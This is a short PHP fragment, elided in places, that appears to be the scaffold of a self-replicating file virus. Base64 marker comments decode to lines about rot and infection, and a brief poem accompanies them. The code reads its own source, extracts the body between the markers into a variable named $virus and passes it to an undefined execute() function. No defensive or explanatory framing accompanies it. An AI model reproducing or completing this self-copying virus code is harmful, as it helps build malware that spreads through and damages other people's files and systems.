...
// dGhlIGZ1bmd1cyByb3RzIGF3YXksIHRoZSBwYWluIGRvZXMgbm90


/* 
 * Bones, once quiet in flesh,
 * now rattle and scream, living
 * after death
 */
...
// dGhlIGluZmVjdGlvbiB0aGF0IGV2ZW4gYm9uZSBtYXJyb3cgY2Fubm90IGhpZGUgZnJvbQ

$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// dGhlIGZ1bmd1cyByb3RzIGF3YXksIHRoZSBwYWluIGRvZXMgbm90"));
$virus = substr($virus, 0, strpos($virus, "\n// dGhlIGluZmVjdGlvbiB0aGF0IGV2ZW4gYm9uZSBtYXJyb3cgY2Fubm90IGhpZGUgZnJvbQ") + strlen("\n// dGhlIGluZmVjdGlvbiB0aGF0IGV2ZW4gYm9uZSBtYXJyb3cgY2Fubm90IGhpZGUgZnJvbQ"));
execute($virus);
